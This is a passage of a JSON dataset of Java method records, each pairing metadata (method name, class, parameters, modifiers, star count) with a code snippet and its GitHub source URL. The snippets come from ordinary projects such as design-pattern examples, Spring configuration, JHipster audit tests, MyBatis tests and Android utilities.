["public"]}}, {"id": 57556, "method_name": "buildCPU", "class_name": "ComputerActualBuilder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void buildCPU(String CPU) {\n        computer.setCPU(CPU);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/builder/ComputerActualBuilder.java", "stars": "2", "class_props": {"extends": "ComputerBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 57557, "method_name": "buildMotherboard", "class_name": "ComputerActualBuilder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void buildMotherboard(String motherboard) {\n        computer.setMotherboard(motherboard);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/builder/ComputerActualBuilder.java", "stars": "2", "class_props": {"extends": "ComputerBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 57558, "method_name": "buildRAM", "class_name": "ComputerActualBuilder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void buildRAM(String RAM) {\n        computer.setRAM(RAM);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/builder/ComputerActualBuilder.java", "stars": "2", "class_props": {"extends": "ComputerBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 57559, "method_name": "buildGPU", "class_name": "ComputerActualBuilder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void buildGPU(String GPU) {\n        computer.setGPU(GPU);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/builder/ComputerActualBuilder.java", "stars": "2", "class_props": {"extends": "ComputerBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 57560, "method_name": "buildMonitor", "class_name": "ComputerActualBuilder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void buildMonitor(String monitor) {\n        computer.setMonitor(monitor);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/builder/ComputerActualBuilder.java", "stars": "2", "class_props": {"extends": "ComputerBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 57561, "method_name": "AssembleComputer", "class_name": "ComputerActualBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Computer", "snippet": "    public Computer AssembleComputer() {\n        return computer;\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/builder/ComputerActualBuilder.java", "stars": "2", "class_props": {"extends": "ComputerBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 57562, "method_name": "fromLocation", "class_name": "PersistentLocation", "params": ["UUID", "Location"], "throws": null, "modifiers": ["public", "static"], "return_type": "PersistentLocation", "snippet": "    public static PersistentLocation fromLocation(@NotNull final UUID owner,\n        @NotNull final Location location) {\n        return new PersistentLocation(owner.toString(), Objects.requireNonNull(location.getWorld()).getName(),\n            location.getX(), location.getY(), location.getZ());\n    }", "url": "https://raw.githubusercontent.com/Sauilitired/Hyperverse/master/Core/src/main/java/se/hyperver/hyperverse/database/PersistentLocation.java", "stars": "25", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 57563, "method_name": "getUuid", "class_name": "PersistentLocation", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    @NotNull public String getUuid() {\n        return this.uuid;\n    }", "url": "https://raw.githubusercontent.com/Sauilitired/Hyperverse/master/Core/src/main/java/se/hyperver/hyperverse/database/PersistentLocation.java", "stars": "25", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 57564, "method_name": "getWorld", "class_name": "PersistentLocation", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    @NotNull public String getWorld() {\n        return this.world;\n    }", "url": "https://raw.githubusercontent.com/Sauilitired/Hyperverse/master/Core/src/main/java/se/hyperver/hyperverse/database/PersistentLocation.java", "stars": "25", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 57565, "method_name": "getX", "class_name": "PersistentLocation", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "    public double getX() {\n        return this.x;\n    }", "url": "https://raw.githubusercontent.com/Sauilitired/Hyperverse/master/Core/src/main/java/se/hyperver/hyperverse/database/PersistentLocation.java", "stars": "25", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 57566, "method_name": "getY", "class_name": "PersistentLocation", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "    public double getY() {\n        return this.y;\n    }", "url": "https://raw.githubusercontent.com/Sauilitired/Hyperverse/master/Core/src/main/java/se/hyperver/hyperverse/database/PersistentLocation.java", "stars": "25", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 57567, "method_name": "getZ", "class_name": "PersistentLocation", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "    public double getZ() {\n        return this.z;\n    }", "url": "https://raw.githubusercontent.com/Sauilitired/Hyperverse/master/Core/src/main/java/se/hyperver/hyperverse/database/PersistentLocation.java", "stars": "25", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 57568, "method_name": "setWorld", "class_name": "PersistentLocation", "params": ["String"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void setWorld(final String world) {\n        this.world = world;\n    }", "url": "https://raw.githubusercontent.com/Sauilitired/Hyperverse/master/Core/src/main/java/se/hyperver/hyperverse/database/PersistentLocation.java", "stars": "25", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 57569, "method_name": "setUuid", "class_name": "PersistentLocation", "params": ["String"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void setUuid(final String uuid) {\n        this.uuid = uuid;\n    }", "url": "https://raw.githubusercontent.com/Sauilitired/Hyperverse/master/Core/src/main/java/se/hyperver/hyperverse/database/PersistentLocation.java", "stars": "25", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 57570, "method_name": "setId", "class_name": "PersistentLocation", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(final int id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/Sauilitired/Hyperverse/master/Core/src/main/java/se/hyperver/hyperverse/database/PersistentLocation.java", "stars": "25", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 57571, "method_name": "getId", "class_name": "PersistentLocation", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getId() {\n        return this.id;\n    }", "url": "https://raw.githubusercontent.com/Sauilitired/Hyperverse/master/Core/src/main/java/se/hyperver/hyperverse/database/PersistentLocation.java", "stars": "25", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 57572, "method_name": "toLocation", "class_name": "PersistentLocation", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Location", "snippet": "    @NotNull public Location toLocation() {\n        return new Location(Bukkit.getWorld(world), x, y, z);\n    }", "url": "https://raw.githubusercontent.com/Sauilitired/Hyperverse/master/Core/src/main/java/se/hyperver/hyperverse/database/PersistentLocation.java", "stars": "25", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 57573, "method_name": "registrationBean", "class_name": "MyFilterConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "FilterRegistrationBean<MyFilter>", "snippet": "    public FilterRegistrationBean<MyFilter> registrationBean() {\n        FilterRegistrationBean<MyFilter> registrationBean = new FilterRegistrationBean<>();\n        registrationBean.setFilter(new MyFilter());\n        registrationBean.addUrlPatterns(\"/person/*\");\n        return registrationBean;\n    }", "url": "https://raw.githubusercontent.com/fawad1997/SpringWebAPI/master/src/main/java/com/restfulspring/apiexample/config/MyFilterConfig.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57574, "method_name": "doGet", "class_name": "CountServlet", "params": ["HttpServletRequest", "HttpServletResponse"], "throws": ["IOException"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n\n        ServletContext servletContext = request.getServletContext();\n        Integer count = (Integer) servletContext.getAttribute(\"count\");\n        if (count == null) {\n            count = 1;\n        } else {\n            count++;\n        }\n        response.setContentType(\"text/html\");\n        response.setCharacterEncoding(\"utf-8\");\n\n        PrintWriter out = response.getWriter();\n        out.write(\"<p>\u672c\u7f51\u9875\u5df2\u88ab\u8bbf\u95ee\uff1a\" + count + \"\u6b21</p>\");\n        servletContext.setAttribute( \"count\",  count);\n\n    }", "url": "https://raw.githubusercontent.com/Nightnessss/web-homework/master/homework01/src/com/fehead/CountServlet.java", "stars": "4", "class_props": {"extends": "HttpServlet", "implements": null, "modifiers": ["public"]}}, {"id": 57575, "method_name": "sendUpdateBroadcast", "class_name": "BroadcastHelper", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void sendUpdateBroadcast(Context context) {\n\t\tIntent intent = new Intent(DP3T.UPDATE_INTENT_ACTION);\n\t\tcontext.sendBroadcast(intent);\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/BroadcastHelper.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57576, "method_name": "sendErrorUpdateBroadcast", "class_name": "BroadcastHelper", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void sendErrorUpdateBroadcast(Context context) {\n\t\tsendUpdateBroadcast(context);\n\n\t\tIntent intent = new Intent(ACTION_UPDATE_ERRORS);\n\t\tcontext.sendBroadcast(intent);\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/BroadcastHelper.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57577, "method_name": "setup", "class_name": "AuditControllerIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setup() {\n        MockitoAnnotations.initMocks(this);\n        AuditEventService auditEventService =\n            new AuditEventService(auditEventRepository, auditEventConverter, jhipsterProperties);\n        AuditController auditController = new AuditController(auditEventService);\n        this.restAuditMockMvc = MockMvcBuilders.standaloneSetup(auditController)\n            .setCustomArgumentResolvers(pageableArgumentResolver)\n            .setConversionService(formattingConversionService)\n            .setMessageConverters(jacksonMessageConverter).build();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/AuditControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57578, "method_name": "initTest", "class_name": "AuditControllerIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initTest() {\n        auditEventRepository.deleteAll();\n        auditEvent = new PersistentAuditEvent();\n        auditEvent.setAuditEventType(SAMPLE_TYPE);\n        auditEvent.setPrincipal(SAMPLE_PRINCIPAL);\n        auditEvent.setAuditEventDate(SAMPLE_TIMESTAMP);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/AuditControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57579, "method_name": "getAllAudits", "class_name": "AuditControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAllAudits() throws Exception {\n        // Initialize the database\n        auditEventRepository.saveAndFlush(auditEvent);\n\n        // Get all the audits\n        restAuditMockMvc.perform(get(\"/management/audits\"))\n            .andExpect(status().isOk())\n            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))\n            .andExpect(jsonPath(\"$.[*].principal\").value(hasItem(SAMPLE_PRINCIPAL)));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/AuditControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57580, "method_name": "getAudit", "class_name": "AuditControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAudit() throws Exception {\n        // Initialize the database\n        auditEventRepository.saveAndFlush(auditEvent);\n\n        // Get the audit\n        restAuditMockMvc.perform(get(\"/management/audits/{id}\", auditEvent.getId()))\n            .andExpect(status().isOk())\n            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))\n            .andExpect(jsonPath(\"$.principal\").value(SAMPLE_PRINCIPAL));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/AuditControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57581, "method_name": "getAuditsByDate", "class_name": "AuditControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAuditsByDate() throws Exception {\n        // Initialize the database\n        auditEventRepository.saveAndFlush(auditEvent);\n\n        // Generate dates for selecting audits by date, making sure the period will contain the audit\n        String fromDate = SAMPLE_TIMESTAMP.minusSeconds(SECONDS_PER_DAY).toString().substring(0, 10);\n        String toDate = SAMPLE_TIMESTAMP.plusSeconds(SECONDS_PER_DAY).toString().substring(0, 10);\n\n        // Get the audit\n        restAuditMockMvc.perform(get(\"/management/audits?fromDate=\" + fromDate + \"&toDate=\" + toDate))\n            .andExpect(status().isOk())\n            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))\n            .andExpect(jsonPath(\"$.[*].principal\").value(hasItem(SAMPLE_PRINCIPAL)));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/AuditControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57582, "method_name": "getNonExistingAuditsByDate", "class_name": "AuditControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getNonExistingAuditsByDate() throws Exception {\n        // Initialize the database\n        auditEventRepository.saveAndFlush(auditEvent);\n\n        // Generate dates for selecting audits by date, making sure the period will not contain the sample audit\n        String fromDate = SAMPLE_TIMESTAMP.minusSeconds(2 * SECONDS_PER_DAY).toString().substring(0, 10);\n        String toDate = SAMPLE_TIMESTAMP.minusSeconds(SECONDS_PER_DAY).toString().substring(0, 10);\n\n        // Query audits but expect no results\n        restAuditMockMvc.perform(get(\"/management/audits?fromDate=\" + fromDate + \"&toDate=\" + toDate))\n            .andExpect(status().isOk())\n            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))\n            .andExpect(header().string(\"X-Total-Count\", \"0\"));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/AuditControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57583, "method_name": "getNonExistingAudit", "class_name": "AuditControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getNonExistingAudit() throws Exception {\n        // Get the audit\n        restAuditMockMvc.perform(get(\"/management/audits/{id}\", Long.MAX_VALUE))\n            .andExpect(status().isNotFound());\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/AuditControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57584, "method_name": "testPersistentAuditEventEquals", "class_name": "AuditControllerIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testPersistentAuditEventEquals() {\n        PersistentAuditEvent auditEvent1 = new PersistentAuditEvent();\n        auditEvent1.setId(1L);\n        PersistentAuditEvent auditEvent2 = new PersistentAuditEvent();\n        auditEvent2.setId(auditEvent1.getId());\n        assertThat(auditEvent1).isEqualTo(auditEvent2);\n        auditEvent2.setId(2L);\n        assertThat(auditEvent1).isNotEqualTo(auditEvent2);\n        auditEvent1.setId(null);\n        assertThat(auditEvent1).isNotEqualTo(auditEvent2);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/AuditControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57585, "method_name": "applyDefaultValueOnAnnotationMapper", "class_name": "AnnotationMapperTest", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void applyDefaultValueOnAnnotationMapper() throws IOException {\n\n    Properties props = new Properties();\n    props.setProperty(PropertyParser.KEY_ENABLE_DEFAULT_VALUE, \"true\");\n\n    Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/global_variables_defaults/mybatis-config.xml\");\n    SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(reader, props);\n    Configuration configuration = factory.getConfiguration();\n    configuration.addMapper(AnnotationMapper.class);\n    SupportClasses.CustomCache cache = SupportClasses.Utils.unwrap(configuration.getCache(AnnotationMapper.class.getName()));\n\n    Assertions.assertThat(cache.getName()).isEqualTo(\"default\");\n\n    try (SqlSession sqlSession = factory.openSession()) {\n      AnnotationMapper mapper = sqlSession.getMapper(AnnotationMapper.class);\n\n      Assertions.assertThat(mapper.ping()).isEqualTo(\"Hello\");\n    }\n\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/global_variables_defaults/AnnotationMapperTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57586, "method_name": "applyPropertyValueOnAnnotationMapper", "class_name": "AnnotationMapperTest", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void applyPropertyValueOnAnnotationMapper() throws IOException {\n\n    Properties props = new Properties();\n    props.setProperty(PropertyParser.KEY_ENABLE_DEFAULT_VALUE, \"true\");\n    props.setProperty(\"ping.sql\", \"SELECT 'Hi' FROM INFORMATION_SCHEMA.SYSTEM_USERS\");\n    props.setProperty(\"cache.name\", \"custom\");\n\n    Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/global_variables_defaults/mybatis-config.xml\");\n    SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(reader, props);\n    Configuration configuration = factory.getConfiguration();\n    configuration.addMapper(AnnotationMapper.class);\n    SupportClasses.CustomCache cache = SupportClasses.Utils.unwrap(configuration.getCache(AnnotationMapper.class.getName()));\n\n    Assertions.assertThat(cache.getName()).isEqualTo(\"custom\");\n\n    try (SqlSession sqlSession = factory.openSession()) {\n      AnnotationMapper mapper = sqlSession.getMapper(AnnotationMapper.class);\n\n      Assertions.assertThat(mapper.ping()).isEqualTo(\"Hi\");\n    }\n\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/global_variables_defaults/AnnotationMapperTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57587, "method_name": "hide", "class_name": "KeyboardUtil", "params": ["Context", "View"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void hide(Context context,View view) {\n        InputMethodManager im = (InputMethodManager) context.getSystemService(Context.INPUT_METHOD_SERVICE);\n        im.hideSoftInputFromWindow(view.getWindowToken(),0);\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/app/src/main/java/com/sunofbeaches/taobaounion/utils/KeyboardUtil.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57588, "method_name": "show", "class_name": "KeyboardUtil", "params": ["Context", "View"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void show(Context context,View view) {\n        InputMethodManager im = (InputMethodManager) context.getSystemService(Context.INPUT_METHOD_SERVICE);\n        im.showSoftInput(view,0);\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/app/src/main/java/com/sunofbeaches/taobaounion/utils/KeyboardUtil.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57589, "method_name": "getId", "class_name": "UserModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57590, "method_name": "setId", "class_name": "UserModel", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Integer id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57591, "method_name": "getName", "class_name": "UserModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        return name;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57592, "method_name": "setName", "class_name": "UserModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {\n        this.name = name;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57593, "method_name": "getGender", "class_name": "UserModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Byte", "snippet": "    public Byte getGender() {\n        return gender;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57594, "method_name": "setGender", "class_name": "UserModel", "params": ["Byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setGender(Byte gender) {\n        this.gender = gender;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57595, "method_name": "getAge", "class_name": "UserModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getAge() {\n        return age;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57596, "method_name": "setAge", "class_name": "UserModel", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAge(Integer age) {\n        this.age = age;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57597, "method_name": "getTelphone", "class_name": "UserModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTelphone() {\n        return telphone;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57598, "method_name": "setTelphone", "class_name": "UserModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTelphone(String telphone) {\n        this.telphone = telphone;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57599, "method_name": "getRegisitMode", "class_name": "UserModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getRegisitMode() {\n        return regisitMode;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57600, "method_name": "setRegisitMode", "class_name": "UserModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRegisitMode(String regisitMode) {\n        this.regisitMode = regisitMode;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57601, "method_name": "getThirdPartyId", "class_name": "UserModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getThirdPartyId() {\n        return thirdPartyId;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57602, "method_name": "setThirdPartyId", "class_name": "UserModel", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setThirdPartyId(Integer thirdPartyId) {\n        this.thirdPartyId = thirdPartyId;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57603, "method_name": "getEncrptPassword", "class_name": "UserModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getEncrptPassword() {\n        return encrptPassword;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57604, "method_name": "setEncrptPassword", "class_name": "UserModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEncrptPassword(String encrptPassword) {\n        this.encrptPassword = encrptPassword;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57605, "method_name": "createPizza", "class_name": "ChicagoPizzaStore", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Pizza", "snippet": "    public Pizza createPizza(String type) {\n        Pizza pizza = null;\n        IPizzaIngredientFactory pizzaIngredientFactory = new ChicagoStylePizzaIngredientFactory();\n\n        // We can have an if-else ladder here\n        if(type == \"Cheese\")\n            pizza = new CheesePizza(pizzaIngredientFactory);\n        return pizza;\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/Factory%20Patterns/Abstract%20Factory%20Pattern/src/PizzaStore/ChicagoPizzaStore.java", "stars": "38", "class_props": {"extends": null, "implements": ["IPizzaStore"], "modifiers": ["public"]}}, {"id": 57606, "method_name": "main", "class_name": "ProxyDesign", "params": ["String"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws Exception{\n        IMessage1 msg = new MessageProxy(new MessageReal());\n        msg.send();\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DesignModel/ProxyDesign.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57607, "method_name": "send", "class_name": "MessageReal", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void send() {\n        System.out.println(\"\u53d1\u9001\u6d88\u606f: www.hzc.cn\");\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DesignModel/ProxyDesign.java", "stars": "10", "class_props": {"extends": null, "implements": ["IMessage1"], "modifiers": []}}, {"id": 57608, "method_name": "connect", "class_name": "MessageProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean connect(){\n        System.out.println(\"\u8fdb\u884c\u6d88\u606f\u53d1\u9001\u901a\u9053\u8fde\u63a5\");\n        return true;\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DesignModel/ProxyDesign.java", "stars": "10", "class_props": {"extends": null, "implements": ["IMessage1"], "modifiers": []}}, {"id": 57609, "method_name": "close", "class_name": "MessageProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void close(){\n        System.out.println(\"\u6d88\u606f\u901a\u9053\u5173\u95ed\");\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DesignModel/ProxyDesign.java", "stars": "10", "class_props": {"extends": null, "implements": ["IMessage1"], "modifiers": []}}, {"id": 57610, "method_name": "send", "class_name": "MessageProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void send() {\n        if(this.connect()){\n            this.message1.send();\n            this.close();\n        }\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DesignModel/ProxyDesign.java", "stars": "10", "class_props": {"extends": null, "implements": ["IMessage1"], "modifiers": []}}, {"id": 57611, "method_name": "execute", "class_name": "MainExecutor", "params": ["Runnable"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void 